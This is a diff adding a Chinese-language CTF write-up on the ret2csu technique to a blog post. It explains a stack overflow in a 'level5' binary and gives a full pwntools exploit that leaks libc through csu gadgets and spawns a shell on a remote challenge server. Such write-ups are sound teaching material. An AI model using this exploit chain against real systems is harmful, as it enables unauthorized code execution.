@@ -428,6 +428,36 @@
 
 <p>但是远程可以打通的</p>
 <img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />
+
+
+
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>借鉴的博客：<a href="https://blog.csdn.net/AcSuccess/article/details/104448463">https://blog.csdn.net/AcSuccess/article/details/104448463</a></p>
+<p>检查保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202733545.png" alt="image-20220618202733545" style="zoom:80%;" />
+
+<p>64位，开启了NX保护，即堆栈段不可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202819738.png" alt="image-20220618202819738" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210224594.png" alt="image-20220618210224594" style="zoom:80%;" />
+
+<p>调用的函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210302293.png" alt="image-20220618210302293" style="zoom:80%;" />
+
+<p>可以看到read函数存在栈溢出，因为buf的字长是128，而读入的数据长度是0x200。</p>
+<p>程序中没有system函数的调用，也没有字符串&#x2F;bin&#x2F;sh，故两个都需要自己去构造</p>
+<p><strong>攻击思路</strong></p>
+<p>1、利用栈溢出执行 libc_csu_gadgets 获取 read 函数地址，并使得程序重新执行 main 函数</p>
+<p>2、根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</p>
+<p>3、再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘&#x2F;bin&#x2F;sh’ 地址，并使得程序重新执行 main 函数。</p>
+<p>4、再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘&#x2F;bin&#x2F;sh’) 获取 shell。</p>
+<p>这题ctf-wiki讲的不是很详细，我上网找了找相关的题解，除了借鉴的博客，<a href="https://wiki.wgpsec.org/knowledge/ctf/ret2csu.html">狼组安全的文库</a>对这个题型进行了详细的讲解</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level5&#x27;)							#我的本地没有打出来，应该是环境的问题</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">128</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">first_csu=<span class="number">0x400606</span></span><br><span class="line">second_csu=<span class="number">0x4005f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12,r13,r14,r15,last</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p64(first_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(second_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x0000000000400460</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload=ret_csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">payload=ret_csu(read_got,<span class="number">0</span>,bss_addr,<span class="number">18</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line">io.sendline(p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=ret_csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220619213844860.png" alt="image-20220619213844860" style="zoom:80%;" />
+
 ]]></content>
       <categories>
         <category>pwn</category>
